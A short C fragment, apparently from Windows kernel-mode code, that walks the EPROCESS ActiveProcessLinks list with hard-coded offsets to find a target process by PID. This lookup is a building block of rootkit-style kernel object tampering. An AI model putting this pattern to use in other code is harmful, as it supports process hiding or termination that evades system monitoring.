	eproc = (DWORD) PsGetCurrentProcess();
	start_PID = *((DWORD*)(eproc+PIDOFFSET));
	current_PID = start_PID;

	while(1)
	{
		if(terminate_PID == current_PID)
			return eproc;
		else if((i_count >= 1) && (start_PID == current_PID))
		{
			return 0x00000000;
		}
		else {
			plist_active_procs = (LIST_ENTRY *) (eproc+FLINKOFFSET);
			eproc = (DWORD) plist_active_procs->Flink;
			eproc = eproc - FLINKOFFSET;
			current_PID = *((int *)(eproc+PIDOFFSET));
			i_count++;
		}
	}
}